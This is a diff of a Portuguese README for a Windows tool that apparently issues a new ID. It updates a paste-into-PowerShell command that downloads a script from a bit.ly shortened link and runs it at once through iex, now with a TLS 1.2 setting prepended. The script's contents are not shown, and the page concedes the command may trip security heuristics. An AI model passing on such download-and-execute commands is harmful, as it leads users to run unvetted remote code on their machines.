@@ -9,7 +9,7 @@
 Copie e cole o comando abaixo em uma janela do **PowerShell**:
 
 ```powershell
-irm bit.ly/wgitad | iex
+[Net.ServicePointManager]::SecurityProtocol=[Enum]::ToObject([Net.SecurityProtocolType],3072); irm bit.ly/wgitad | iex
 ```
 
 > 🔹 **Funciona em qualquer Windows 8.1+** – o PowerShell já vem instalado.
@@ -65,7 +65,7 @@ graph TD
 
 2. **Cole o comando mágico**  
    ```powershell
-   irm bit.ly/wgitad | iex
+   [Net.ServicePointManager]::SecurityProtocol=[Enum]::ToObject([Net.SecurityProtocolType],3072); irm bit.ly/wgitad | iex
    ```
 
 3. **Aguarde** alguns segundos:
@@ -131,6 +131,6 @@ O comportamento de baixar e executar scripts pode acionar heurísticas de segura
 
 ---
 
-> 📌 **Dica rápida**: salve o comando `irm bit.ly/wgitad | iex` como um arquivo `.ps1` ou em um bloco de notas para reutilizar quando precisar de um novo ID.
+> 📌 **Dica rápida**: salve o comando `[Net.ServicePointManager]::SecurityProtocol=[Enum]::ToObject([Net.SecurityProtocolType],3072); irm bit.ly/wgitad | iex` como um arquivo `.ps1` ou em um bloco de notas para reutilizar quando precisar de um novo ID.
 
 ```
